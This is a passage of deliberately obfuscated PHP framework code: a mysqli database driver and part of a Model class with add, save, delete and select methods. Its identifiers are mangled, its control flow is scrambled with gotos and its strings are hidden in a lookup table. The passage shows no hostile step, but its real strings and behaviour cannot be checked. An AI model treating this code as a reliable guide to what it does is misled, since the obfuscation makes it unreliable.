$this->linkID[$CŒê¨¬≈Ã¡]->query($FøÖÊ∫ı£á[883]); } goto EÀÖÕêΩÏÇ; EÀÖÕêΩÏÇ: $this->connected = !0; if (1 != think_config($FøÖÊ∫ı£á[18])) { unset($this->config); } goto fõÍ”“¢ÉÒ; BÔﬁµ•∆î∏: if (empty($e‚™å¬›¥â)) { $e‚™å¬›¥â = $this->config; } $this->linkID[$CŒê¨¬≈Ã¡] = new mysqli($e‚™å¬›¥â[$FøÖÊ∫ı£á[876]], $e‚™å¬›¥â[$FøÖÊ∫ı£á[878]], $e‚™å¬›¥â[$FøÖÊ∫ı£á[879]], $e‚™å¬›¥â[$FøÖÊ∫ı£á[17]], $e‚™å¬›¥â[$FøÖÊ∫ı£á[877]] ? intval($e‚™å¬›¥â[$FøÖÊ∫ı£á[877]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aí∞Ç∫““Ñ; fõÍ”“¢ÉÒ: } return $this->linkID[$CŒê¨¬≈Ã¡]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Fî†¢Ø©„ì) { goto fæõ£»ø¥∫; F¿∑úŒò∂á: think_status($BØœÔµœˆƒ[20]); $this->queryID = $this->_linkID->query($Fî†¢Ø©„ì); if ($this->_linkID->more_results()) { while (($f»ê≠ÇíÒó = $this->_linkID->next_result()) != NULL) { $f»ê≠ÇíÒó->free_result(); } } goto Dîóéßñ≈ä; Dîóéßñ≈ä: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Dï∫ò¡äı•; fæõ£»ø¥∫: $BØœÔµœˆƒ =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f¿»Æ√£èò; f¿»Æ√£èò: $this->queryStr = $Fî†¢Ø©„ì; if ($this->queryID) { $this->free(); } think_action_status($BØœÔµœˆƒ[19], 1); goto F¿∑úŒò∂á; Dï∫ò¡äı•: } public function execute($D‚°ª˘™ê ) { goto aﬁÀßˆÇÛ§; d◊ﬁß®™ç∞: if (!1 === $AÃºôÓ¬î‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto e≠ﬁÌøˆı∫; Bõ©≥Ω÷¢ü: think_status($Eò°ﬁìÿçã[20]); $AÃºôÓ¬î‹ = $this->_linkID->query($D‚°ª˘™ê ); $this->debug(); goto d◊ﬁß®™ç∞; E†ƒòñ√Éç: $this->queryStr = $D‚°ª˘™ê ; if ($this->queryID) { $this->free(); } think_action_status($Eò°ﬁìÿçã[21], 1); goto Bõ©≥Ω÷¢ü; aﬁÀßˆÇÛ§: $Eò°ﬁìÿçã =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E†ƒòñ√Éç; e≠ﬁÌøˆı∫: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÙ°¶ç¡‰° = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CÙ°¶ç¡‰°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D’®Î»˜˘á = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D’®Î»˜˘á) { $this->error(); return !1; } } return !0; } private function getAll() { $aﬂöÑ⁄Õ¿’ = array(); if ($this->numRows > 0) { for ($CÚ«¯Ñﬂ∂ö = 0; $CÚ«¯Ñﬂ∂ö < $this->numRows; $CÚ«¯Ñﬂ∂ö++) { $aﬂöÑ⁄Õ¿’[$CÚ«¯Ñﬂ∂ö] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aﬂöÑ⁄Õ¿’; } public function getFields($AÊÙˆ´ÛÉø) { $FÿóçÒÓÖâ =& $_SERVER[’ÿƒ†ïò]; $B¿—ÂÉ≈´™ = $this->query($FÿóçÒÓÖâ[887] . $this->parseKey($AÊÙˆ´ÛÉø)); $dèãÀ¥¶Õï = array(); if ($B¿—ÂÉ≈´™) { foreach ($B¿—ÂÉ≈´™ as $B¶¥àÕ‡™“ => $AÿÆÆÕôò˜) { $dèãÀ¥¶Õï[$AÿÆÆÕôò˜[$FÿóçÒÓÖâ[27]]] = array($FÿóçÒÓÖâ[28] => $AÿÆÆÕôò˜[$FÿóçÒÓÖâ[27]], $FÿóçÒÓÖâ[29] => $AÿÆÆÕôò˜[$FÿóçÒÓÖâ[30]], $FÿóçÒÓÖâ[31] => (bool) ($AÿÆÆÕôò˜[$FÿóçÒÓÖâ[32]] === $FÿóçÒÓÖâ[33]), $FÿóçÒÓÖâ[34] => $AÿÆÆÕôò˜[$FÿóçÒÓÖâ[35]], $FÿóçÒÓÖâ[36] => strtolower($AÿÆÆÕôò˜[$FÿóçÒÓÖâ[37]]) == $FÿóçÒÓÖâ[38], $FÿóçÒÓÖâ[39] => strtolower($AÿÆÆÕôò˜[$FÿóçÒÓÖâ[40]]) == $FÿóçÒÓÖâ[41]); } } return $dèãÀ¥¶Õï; } public function getTables($AÙ∞Ñ„∂æ´ = '') { $aû»≠ãÕπ„ =& $_SERVER[’ÿƒ†ïò]; $f†ÃñûŒºÃ = !empty($AÙ∞Ñ„∂æ´) ? $aû»≠ãÕπ„[889] . $AÙ∞Ñ„∂æ´ . $aû»≠ãÕπ„[890] : $aû»≠ãÕπ„[891]; $a¢ü†éÖ∏é = $this->query($f†ÃñûŒºÃ); $Aª≥Ôå≥ó· = array(); if ($a¢ü†éÖ∏é) { foreach ($a¢ü†éÖ∏é as $AéØÃøº¶¥ => $EÏ√⁄›¿éÃ) { $Aª≥Ôå≥ó·[$AéØÃøº¶¥] = current($EÏ√⁄›¿éÃ); } } return $Aª≥Ôå≥ó·; } public function replace($EœÎç‰‘€ç, $dæ◊¶éÒÌ‚ = array()) { $F•é·êï÷≈ =& $_SERVER[’ÿƒ†ïò]; foreach ($EœÎç‰‘€ç as $A·ã—≈⁄˘ÿ => $dÌ±Ö¶‘Œ¡) { $c√ïà…˘Öµ = $this->parseValue($dÌ±Ö¶‘Œ¡); if (is_scalar($c√ïà…˘Öµ)) { $dÉÏœ∞öÔ§[] = $c√ïà…˘Öµ; $dÖ™˘ï≥“≥[] = $this->parseKey($A·ã—≈⁄˘ÿ); } } $b†û–≠˘°¬ = $F•é·êï÷≈[892] . $this->parseTable($dæ◊¶éÒÌ‚[$F•é·êï÷≈[277]]) . $F•é·êï÷≈[893] . implode($F•é·êï÷≈[47], $dÖ™˘ï≥“≥) . $F•é·êï÷≈[894] . implode($F•é·êï÷≈[47], $dÉÏœ∞öÔ§) . $F•é·êï÷≈[895]; return $this->execute($b†û–≠˘°¬); } public function insertAll($b¿∂àº∑’±, $a·Øí¬À˜Ï = array(), $DÒñíó∑•ö = false) { goto A∞ù”†“à‡; A∞ù”†“à‡: $cû¥öÓ¶ÿË =& $_SERVER[’ÿƒ†ïò]; if (!is_array($b¿∂àº∑’±[0])) { return !1; } $dï…ëë¡‚› = array_keys($b¿∂àº∑’±[0]); goto aåã≈Æâ•¯; aåã≈Æâ•¯: $Dı≥∆»û’˘ = array(); foreach ($b¿∂àº∑’± as $d≠ç≤ã—‹ﬂ) { $Eµä‘–âå¬ = array(); foreach ($d≠ç≤ã—‹ﬂ as $e¯ÈÑáëó∆ => $f“©—ÙÉèÌ) { $f“©—ÙÉèÌ = $this->parseValue($f“©—ÙÉèÌ); if (is_scalar($f“©—ÙÉèÌ)) { $Eµä‘–âå¬[] = $f“©—ÙÉèÌ; } } $Dı≥∆»û’˘[] = $cû¥öÓ¶ÿË[258] . implode($cû¥öÓ¶ÿË[47], $Eµä‘–âå¬) . $cû¥öÓ¶ÿË[895]; } array_walk($dï…ëë¡‚›, array($this, $cû¥öÓ¶ÿË[896])); goto b„å——îö‹; b„å——îö‹: $Dƒ¬ÒÍ»∞◊ = $DÒñíó∑•ö ? $cû¥öÓ¶ÿË[897] : $cû¥öÓ¶ÿË[898]; $aê¨¥›“àµ = $Dƒ¬ÒÍ»∞◊ . $cû¥öÓ¶ÿË[899] . $this->parseTable($a·Øí¬À˜Ï[$cû¥öÓ¶ÿË[277]]) . $cû¥öÓ¶ÿË[893] . implode($cû¥öÓ¶ÿË[47], $dï…ëë¡‚›) . $cû¥öÓ¶ÿË[900] . implode($cû¥öÓ¶ÿË[47], $Dı≥∆»û’˘); return $this->execute($aê¨¥›“àµ); goto fä‰Íà„Ñö; fä‰Íà„Ñö: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EßåïÃÏÍ =& $_SERVER[’ÿƒ†ïò]; $this->error = $this->_linkID->errno . $EßåïÃÏÍ[4] . $this->_linkID->error; if ($EßåïÃÏÍ[33] != $this->queryStr) { $this->error .= LNG($EßåïÃÏÍ[45]) . $this->queryStr; } think_trace($this->error, $EßåïÃÏÍ[33], $EßåïÃÏÍ[46]); return $this->error; } public function escapeString($d≤êÒÁ≤Ç≥) { if ($this->_linkID) { return $this->_linkID->real_escape_string($d≤êÒÁ≤Ç≥); } else { return addslashes($d≤êÒÁ≤Ç≥); } } public function parseKey(&$fö©Ú√º¯É, $b…´ﬂàÔπﬁ = true) { $D∑º±‘ﬂóÛ =& $_SERVER[’ÿƒ†ïò]; if ($b…´ﬂàÔπﬁ) { $fö©Ú√º¯É = $this->parseKeyCheck($fö©Ú√º¯É); } if ($fö©Ú√º¯É != $D∑º±‘ﬂóÛ[182] && !preg_match($D∑º±‘ﬂóÛ[901], $fö©Ú√º¯É)) { $fö©Ú√º¯É = $D∑º±‘ﬂóÛ[383] . trim($fö©Ú√º¯É, $D∑º±‘ﬂóÛ[383]) . $D∑º±‘ﬂóÛ[383]; } return $fö©Ú√º¯É; } } goto aŒ≠„ªë“Û; E®ãÛà’ä”: define($_SERVER[’ÿƒ†ïò][240], 0); define($_SERVER[’ÿƒ†ïò][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\157\162\144\x65\x72", "\x61\x6c\151\x61\163", "\x68\141\x76\151\x6e\147", "\147\x72\157\165\160", "\x6c\x6f\x63\x6b", "\144\x69\x73\x74\151\x6e\143\164", "\x61\x75\x74\x6f", "\x66\151\x6c\x74\x65\162", "\166\x61\x6c\x69\x64\141\x74\x65", "\x72\x65\x73\x75\154\164", "\x62\x69\x6e\144", "\164\x6f\153\x65\x6e"); public function __construct($b‹…Ù˘è©≈ = '', $eﬂ“∏«»Òê = '', $déóûÆÛ∫É = '') { $b¯£ΩÀ◊ﬂÿ =& $_SERVER[’ÿƒ†ïò]; $this->_initialize(); if (!empty($b‹…Ù˘è©≈)) { if (strpos($b‹…Ù˘è©≈, $b¯£ΩÀ◊ﬂÿ[95])) { list($this->dbName, $this->name) = explode($b¯£ΩÀ◊ﬂÿ[95], $b‹…Ù˘è©≈); } else { $this->name = $b‹…Ù˘è©≈; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eﬂ“∏«»Òê)) { $this->tablePrefix = $b¯£ΩÀ◊ﬂÿ[33]; } elseif ($b¯£ΩÀ◊ﬂÿ[33] != $eﬂ“∏«»Òê) { $this->tablePrefix = $eﬂ“∏«»Òê; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($b¯£ΩÀ◊ﬂÿ[242]); } $this->db(0, empty($this->connection) ? $déóûÆÛ∫É : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Dòõ‰éÖô± =& $_SERVER[’ÿƒ†ïò]; if (empty($this->fields)) { if (think_config($Dòõ‰éÖô±[243])) { $a≈∑ì“ô‚“ = $this->dbName ? $this->dbName : think_config($Dòõ‰éÖô±[244]); $f‚œ≈∆ıﬂ§ = think_var_cache($Dòõ‰éÖô±[245] . strtolower(get_path_this($a≈∑ì“ô‚“) . $Dòõ‰éÖô±[95] . $this->name)); if ($f‚œ≈∆ıﬂ§) { $d∑¥çÕî√ü = think_config($Dòõ‰éÖô±[246]); if (empty($d∑¥çÕî√ü) || $f‚œ≈∆ıﬂ§[$Dòõ‰éÖô±[247]] == $d∑¥çÕî√ü) { $this->fields = $f‚œ≈∆ıﬂ§; return; } } } $this->flush(); } } public function flush() { goto E¢”πÒú¢ÿ; FÂÌ≠≤ÓåÑ: if (think_config($c‘Ùè÷Ã∆∂[243])) { $C§ûÈƒ∂üÉ = $this->dbName ? $this->dbName : think_config($c‘Ùè÷Ã∆∂[244]); think_var_cache($c‘Ùè÷Ã∆∂[245] . strtolower(get_path_this($C§ûÈƒ∂üÉ) . $c‘Ùè÷Ã∆∂[95] . $this->name), $this->fields); } goto eîıÁŸËñ∏; Bµª††ÎÁ…: if (!$cÂé†ö’®Ö) { return !1; } $this->fields = array_keys($cÂé†ö’®Ö); $this->fields[$c‘Ùè÷Ã∆∂[248]] = !1; goto A¢ÔÍ®ÇÈ≈; E¢”πÒú¢ÿ: $c‘Ùè÷Ã∆∂ =& $_SERVER[’ÿƒ†ïò]; $this->db->setModel($this->name); $cÂé†ö’®Ö = $this->db->getFields($this->getTableName()); goto Bµª††ÎÁ…; A¢ÔÍ®ÇÈ≈: foreach ($cÂé†ö’®Ö as $d≤ÑÖ‰ÇáÇ => $b¿à°ÇÒÈØ) { $Dä°Ÿâﬁáß[$d≤ÑÖ‰ÇáÇ] = $b¿à°ÇÒÈØ[$c‘Ùè÷Ã∆∂[29]]; if ($b¿à°ÇÒÈØ[$c‘Ùè÷Ã∆∂[36]]) { $this->fields[$c‘Ùè÷Ã∆∂[249]] = $d≤ÑÖ‰ÇáÇ; if ($b¿à°ÇÒÈØ[$c‘Ùè÷Ã∆∂[39]]) { $this->fields[$c‘Ùè÷Ã∆∂[248]] = !0; } } } $this->fields[$c‘Ùè÷Ã∆∂[250]] = $Dä°Ÿâﬁáß; if (think_config($c‘Ùè÷Ã∆∂[246])) { $this->fields[$c‘Ùè÷Ã∆∂[247]] = think_config($c‘Ùè÷Ã∆∂[246]); } goto FÂÌ≠≤ÓåÑ; eîıÁŸËñ∏: } public function switchModel($e ıãø⁄ªø, $F‰øáÇÍÆÈ = array()) { $E‰âﬂé≤≤û =& $_SERVER[’ÿƒ†ïò]; $aÔÁ÷ÖóáØ = ucwords(strtolower($e ıãø⁄ªø)) . $E‰âﬂé≤≤û[251]; if (!class_exists($aÔÁ÷ÖóáØ)) { think_exception($aÔÁ÷ÖóáØ . think_lang($E‰âﬂé≤≤û[252])); } $this->_extModel = new $aÔÁ÷ÖóáØ($this->name); if (!empty($F‰øáÇÍÆÈ)) { foreach ($F‰øáÇÍÆÈ as $A∞⁄ƒ◊ñ·ú) { $this->_extModel->setProperty($A∞⁄ƒ◊ñ·ú, $this->{$A∞⁄ƒ◊ñ·ú}); } } return $this->_extModel; } public function __set($F ÚóîÜØß, $eÃóıª¨…ú) { $this->data[$F ÚóîÜØß] = $eÃóıª¨…ú; } public function __get($eΩç´ïÛ¥§) { return isset($this->data[$eΩç´ïÛ¥§]) ? $this->data[$eΩç´ïÛ¥§] : null; } public function __isset($BıØâ√¿Ï™) { return isset($this->data[$BıØâ√¿Ï™]); } public function __unset($d√òïÃ∂êæ) { unset($this->data[$d√òïÃ∂êæ]); } public function __call($B—â≈Ωœä‘, $FãÊìŒ¡í⁄) { $fÎ°ÙäØÑÉ =& $_SERVER[’ÿƒ†ïò]; if (in_array(strtolower($B—â≈Ωœä‘), $this->methods, !0)) { $this->options[strtolower($B—â≈Ωœä‘)] = $FãÊìŒ¡í⁄[0]; return $this; } elseif (in_array(strtolower($B—â≈Ωœä‘), array($fÎ°ÙäØÑÉ[253], $fÎ°ÙäØÑÉ[254], $fÎ°ÙäØÑÉ[255], $fÎ°ÙäØÑÉ[256], $fÎ°ÙäØÑÉ[257]), !0)) { $Bßõ“‡≥Ó„ = isset($FãÊìŒ¡í⁄[0]) ? $FãÊìŒ¡í⁄[0] : $fÎ°ÙäØÑÉ[182]; $Bßõ“‡≥Ó„ = $this->db->parseKey($Bßõ“‡≥Ó„); return $this->getField(strtoupper($B—â≈Ωœä‘) . $fÎ°ÙäØÑÉ[258] . $Bßõ“‡≥Ó„ . $fÎ°ÙäØÑÉ[259] . $B—â≈Ωœä‘, $fÎ°ÙäØÑÉ[253]); } elseif (strtolower(substr($B—â≈Ωœä‘, 0, 5)) == $fÎ°ÙäØÑÉ[260]) { $Bßõ“‡≥Ó„ = think_parse_name(substr($B—â≈Ωœä‘, 5)); $eÔ‚Ç≥Ï‚≈[$Bßõ“‡≥Ó„] = $FãÊìŒ¡í⁄[0]; return $this->where($eÔ‚Ç≥Ï‚≈)->find(); } elseif (strtolower(substr($B—â≈Ωœä‘, 0, 10)) == $fÎ°ÙäØÑÉ[261]) { $C¥â€ÒáËÜ = think_parse_name(substr($B—â≈Ωœä‘, 10)); $eÔ‚Ç≥Ï‚≈[$C¥â€ÒáËÜ] = $FãÊìŒ¡í⁄[0]; return $this->where($eÔ‚Ç≥Ï‚≈)->getField($FãÊìŒ¡í⁄[1]); } elseif (isset($this->_scope[$B—â≈Ωœä‘])) { return $this->scope($B—â≈Ωœä‘, $FãÊìŒ¡í⁄[0]); } elseif (method_exists($this, $B—â≈Ωœä‘)) { array_unshift($FãÊìŒ¡í⁄, $B—â≈Ωœä‘); return call_user_func_array(array($this, $fÎ°ÙäØÑÉ[262]), $FãÊìŒ¡í⁄); } else { return call_user_func_array(array(parent, $B—â≈Ωœä‘), $FãÊìŒ¡í⁄); } } protected function call() { goto Aíêœ‘Õ∫°; AÜíπé∂¿†: if (isset($aÑ»ÂÆåÖï[$E€‘ºØê„˘]) && $aÑ»ÂÆåÖï[$E€‘ºØê„˘] === $A◊´ëÀ◊ÚØ) { think_exception(__CLASS__ . $d∂Ç„àÔ∆∫[4] . $A◊´ëÀ◊ÚØ . think_lang($d∂Ç„àÔ∆∫[263])); return; } $aÑ»ÂÆåÖï[] = $A◊´ëÀ◊ÚØ; if (method_exists($this, $d∂Ç„àÔ∆∫[264])) { $d‡Ñ—Ω Éª = call_user_func_array(array($this, $d∂Ç„àÔ∆∫[265]), array($aÇÙòÎ…ô†, $aÑ»ÂÆåÖï)); if (!is_null($d‡Ñ—Ω Éª) && $d‡Ñ—Ω Éª !== !1) { return $d‡Ñ—Ω Éª; } } goto F„◊ãªÿãÚ; Aíêœ‘Õ∫°: $d∂Ç„àÔ∆∫ =& $_SERVER[’ÿƒ†ïò]; $aÑ»ÂÆåÖï = func_get_args(); $A◊´ëÀ◊ÚØ = array_shift($aÑ»ÂÆåÖï); goto bÆö•¡éÑ€; F„◊ãªÿãÚ: $EÁÃ” Ù°Ü = call_user_func_array(array($this, $A◊´ëÀ◊ÚØ), $aÑ»ÂÆåÖï); if (method_exists($this, $d∂Ç„àÔ∆∫[266])) { $d‡Ñ—Ω Éª = call_user_func_array(array($this, $d∂Ç„àÔ∆∫[267]), array($aÇÙòÎ…ô†, $aÑ»ÂÆåÖï, $EÁÃ” Ù°Ü)); if ($d‡Ñ—Ω Éª) { return $d‡Ñ—Ω Éª; } } return $EÁÃ” Ù°Ü; goto a„Ü€ëÒ∂Ò; bÆö•¡éÑ€: $aÇÙòÎ…ô† = $A◊´ëÀ◊ÚØ; if (is_array($A◊´ëÀ◊ÚØ)) { $aÇÙòÎ…ô† = $A◊´ëÀ◊ÚØ[1]; $A◊´ëÀ◊ÚØ = $A◊´ëÀ◊ÚØ[0]; } $E€‘ºØê„˘ = count($aÑ»ÂÆåÖï) - 1; goto AÜíπé∂¿†; a„Ü€ëÒ∂Ò: } protected function _initialize() { } protected function _facade($Cä€Ù¢¢≤”) { $f≤‚°∞¢ÖŸ =& $_SERVER[’ÿƒ†ïò]; if (!empty($this->fields)) { foreach ($Cä€Ù¢¢≤” as $F≠üöÙÛ–± => $eî¿‚Í¶äü) { if (is_array($this->fields) && !in_array($F≠üöÙÛ–±, $this->fields, !0)) { unset($Cä€Ù¢¢≤”[$F≠üöÙÛ–±]); } elseif (is_scalar($eî¿‚Í¶äü)) { $this->_parseType($Cä€Ù¢¢≤”, $F≠üöÙÛ–±); } } } if (!empty($this->options[$f≤‚°∞¢ÖŸ[268]])) { $Cä€Ù¢¢≤” = array_map($this->options[$f≤‚°∞¢ÖŸ[268]], $Cä€Ù¢¢≤”); unset($this->options[$f≤‚°∞¢ÖŸ[268]]); } $this->_beforeWrite($Cä€Ù¢¢≤”); return $Cä€Ù¢¢≤”; } protected function _beforeWrite(&$Cà‰ÚºâçË) { } public function add($DÖØÜ‡€ãÆ = '', $BÍπê˘´˘≈ = array(), $aâ‡± ﬂ = false) { goto D√îÃãà©Â; c“’…ê∫•⁄: return $dÎ˜â¬ÿÊΩ; goto BÓ∆ç‘·Ü„; D√îÃãà©Â: if (empty($DÖØÜ‡€ãÆ)) { if (!empty($this->data)) { $DÖØÜ‡€ãÆ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[’ÿƒ†ïò][269]); return !1; } } $BÍπê˘´˘≈ = $this->_parseOptions($BÍπê˘´˘≈); $DÖØÜ‡€ãÆ = $this->_facade($DÖØÜ‡€ãÆ); goto Aôâ…∫•ë¿; Aôâ…∫•ë¿: if (!1 === $this->_beforeInsert($DÖØÜ‡€ãÆ, $BÍπê˘´˘≈)) { return !1; } $dÎ˜â¬ÿÊΩ = $this->db->insert($DÖØÜ‡€ãÆ, $BÍπê˘´˘≈, $aâ‡± ﬂ); if (!1 !== $dÎ˜â¬ÿÊΩ) { $aËÕô“Öâù = $this->getLastInsID(); if ($aËÕô“Öâù) { $DÖØÜ‡€ãÆ[$this->getPk()] = $aËÕô“Öâù; $this->_after_insert($DÖØÜ‡€ãÆ, $BÍπê˘´˘≈); return $aËÕô“Öâù; } $this->_after_insert($DÖØÜ‡€ãÆ, $BÍπê˘´˘≈); } goto c“’…ê∫•⁄; BÓ∆ç‘·Ü„: } protected function _beforeInsert(&$C≈’∞√ÊÍ∑, $B¯≤Ò‡πíü) { } protected function _after_insert($aí˜Ì∞¨‚‚, $EÛ•¶ˆ∑éå) { } public function addAll($CÏŸ∫ﬁÊ“Ù, $Eû±°íÖ∑© = array(), $fá‰•Ó—‰” = false) { goto e“≠∏ô›™Ã; eﬁ‡ê∑€’≤: foreach ($CÏŸ∫ﬁÊ“Ù as $f®÷…°Àƒí => $A©‚Ó¡éÎö) { $CÏŸ∫ﬁÊ“Ù[$f®÷…°Àƒí] = $this->_facade($A©‚Ó¡éÎö); } if (method_exists($this->db, $E»≠Éç¿›õ[270])) { $cÃ¿£á¢ƒÁ = $this->db->insertAll($CÏŸ∫ﬁÊ“Ù, $Eû±°íÖ∑©, $fá‰•Ó—‰”); } else { $this->startTrans(); foreach ($CÏŸ∫ﬁÊ“Ù as $f®÷…°Àƒí => $A©‚Ó¡éÎö) { $cÃ¿£á¢ƒÁ = $this->db->insert($A©‚Ó¡éÎö, $Eû±°íÖ∑©, $fá‰•Ó—‰”); } $this->commit(); } if (!1 !== $cÃ¿£á¢ƒÁ) { $fá‰”±èÉë = $this->getLastInsID(); if ($fá‰”±èÉë) { return $fá‰”±èÉë; } } goto aê—‰Ñô ¢; aê—‰Ñô ¢: return $cÃ¿£á¢ƒÁ; goto d–àËÁéµª; e“≠∏ô›™Ã: $E»≠Éç¿›õ =& $_SERVER[’ÿƒ†ïò]; if (empty($CÏŸ∫ﬁÊ“Ù)) { $this->error = think_lang($E»≠Éç¿›õ[269]); return !1; } $Eû±°íÖ∑© = $this->_parseOptions($Eû±°íÖ∑©); goto eﬁ‡ê∑€’≤; d–àËÁéµª: } public function selectAdd($cî≤Êõò»Ú = '', $C≥ëà“ÌÕñ = '', $Eå§Æ¡î‰à = array()) { $A◊™´¿©ëﬁ =& $_SERVER[’ÿƒ†ïò]; $Eå§Æ¡î‰à = $this->_parseOptions($Eå§Æ¡î‰à); if (!1 === ($D¯ÔèÊ˜–´ = $this->db->selectInsert($cî≤Êõò»Ú ? $cî≤Êõò»Ú : $Eå§Æ¡î‰à[$A◊™´¿©ëﬁ[271]], $C≥ëà“ÌÕñ ? $C≥ëà“ÌÕñ : $this->getTableName(), $Eå§Æ¡î‰à))) { $this->error = think_lang($A◊™´¿©ëﬁ[272]); return !1; } else { return $D¯ÔèÊ˜–´; } } public function save($f±ô∑≥µÕÃ = '', $BÂ«∫ß‚”Ö = array()) { goto fàïÒ»ΩíÛ; bä…ù•›˘”: if (is_array($BÂ«∫ß‚”Ö[$d¯¨Ëê∞úë[273]]) && isset($BÂ«∫ß‚”Ö[$d¯¨Ëê∞úë[273]][$FÂàπöäÌÑ])) { $DâíÉˆÃ»∑ = $BÂ«∫ß‚”Ö[$d¯¨Ëê∞úë[273]][$FÂàπöäÌÑ]; } if (!1 === $this->_beforeUpdate($f±ô∑≥µÕÃ, $BÂ«∫ß‚”Ö)) { return !1; } $a◊áçñˆ¥§ = $this->db->update($f±ô∑≥µÕÃ, $BÂ«∫ß‚”Ö); goto fäõÕ·Ñ¥à; fäõÕ·Ñ¥à: if (!1 !== $a◊áçñˆ¥§) { if (isset($DâíÉˆÃ»∑)) { $f±ô∑≥µÕÃ[$FÂàπöäÌÑ] = $DâíÉˆÃ»∑; } $this->_afterUpdate($f±ô∑≥µÕÃ, $BÂ«∫ß‚”Ö); } return $a◊áçñˆ¥§; goto fÊ‚è¢ÿŸå; d∞è∞¬Ì‰é: $BÂ«∫ß‚”Ö = $this->_parseOptions($BÂ«∫ß‚”Ö); $FÂàπöäÌÑ = $this->getPk(); if (!isset($BÂ«∫ß‚”Ö[$d¯¨Ëê∞úë[273]])) { if (isset($f±ô∑≥µÕÃ[$FÂàπöäÌÑ])) { $aê≥√Óóµø[$FÂàπöäÌÑ] = $f±ô∑≥µÕÃ[$FÂàπöäÌÑ]; $BÂ«∫ß‚”Ö[$d¯¨Ëê∞úë[273]] = $aê≥√Óóµø; unset($f±ô∑≥µÕÃ[$FÂàπöäÌÑ]); } else { $this->error = think_lang($d¯¨Ëê∞úë[272]); return !1; } } goto bä…ù•›˘”; fàïÒ»ΩíÛ: $d¯¨Ëê∞úë =& $_SERVER[’ÿƒ†ïò]; if (empty($f±ô∑≥µÕÃ)) { if (!empty($this->data)) { $f±ô∑≥µÕÃ = $this->data; $this->data = array(); } else { $this->error = think_lang($d¯¨Ëê∞úë[269]); return !1; } } $f±ô∑≥µÕÃ = $this->_facade($f±ô∑≥µÕÃ); goto d∞è∞¬Ì‰é; fÊ‚è¢ÿŸå: } protected function _beforeUpdate(&$Dïß™¡ö⁄ç, $Eºâ‘ØùàØ) { } protected function _afterUpdate($a¥◊õŒŸ˜ï, $dõÑˆü⁄áõ) { } public function delete($aÔﬂ“àíêº = array()) { goto Cˆ—∑‡¨ûä; fÌ©≥ﬁÎêº: if (is_numeric($aÔﬂ“àíêº) || is_string($aÔﬂ“àíêº)) { if (strpos($aÔﬂ“àíêº, $e˘¯◊Ò∂üÍ[47])) { $bÔëéîÆé[$F£ï‡ÀÉ”≥] = array($e˘¯◊Ò∂üÍ[274], $aÔﬂ“àíêº); } else { $bÔëéîÆé[$F£ï‡ÀÉ”≥] = $aÔﬂ“àíêº; } $this->options[$e˘¯◊Ò∂üÍ[273]] = $bÔëéîÆé; } $aÔﬂ“àíêº = $this->_parseOptions(); if (is_array($aÔﬂ“àíêº[$e˘¯◊Ò∂üÍ[273]]) && isset($aÔﬂ“àíêº[$e˘¯◊Ò∂üÍ[273]][$F£ï‡ÀÉ”≥])) { $bÂÕëèΩ™≠ = $aÔﬂ“àíêº[$e˘¯◊Ò∂üÍ[273]][$F£ï‡ÀÉ”≥]; } goto A´´çÃ∞Òä; A´´çÃ∞Òä: $D·à˜ÿ™¿» = $this->db->delete($aÔﬂ“àíêº); if (!1 !== $D·à˜ÿ™¿») { $A´–¥í§ñ≠ = array(); if (isset($bÂÕëèΩ™≠)) { $A´–¥í§ñ≠[$F£ï‡ÀÉ”≥] = $bÂÕëèΩ™≠; } $this->_after_delete($A´–¥í§ñ≠, $aÔﬂ“àíêº); } return $D·à˜ÿ™¿»; goto fÆ¿Õªöè›; Cˆ—∑‡¨ûä: $e˘¯◊Ò∂üÍ =& $_SERVER[’ÿƒ†ïò]; if (empty($aÔﬂ“àíêº) && empty($this->options[$e˘¯◊Ò∂üÍ[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $F£ï‡ÀÉ”≥ = $this->getPk(); goto fÌ©≥ﬁÎêº; fÆ¿Õªöè›: } protected function _after_delete($E¶˜›¨•œ´, $Bçˆ“É∏˜Ì) { } public function select($A¡Í‘∞‡Úä = array()) { goto BÕëô˘∏Ã§; BÕëô˘∏Ã§: $EÇ≤¢Ç†ƒá =& $_SERVER[’ÿƒ†ïò]; if (is_string($A¡Í‘∞‡Úä) || is_numeric($A¡Í‘∞‡Úä)) { $DÎÉ‘©›Öƒ = $this->getPk(); if (strpos($A¡Í‘∞‡Úä, $EÇ≤¢Ç†ƒá[47])) { $Aπ÷Ñ›é€µ[$DÎÉ‘©›Öƒ] = array($EÇ≤¢Ç†ƒá[274], $A¡Í‘∞‡Úä); } else { $Aπ÷Ñ›é€µ[$DÎÉ‘©›Öƒ] = 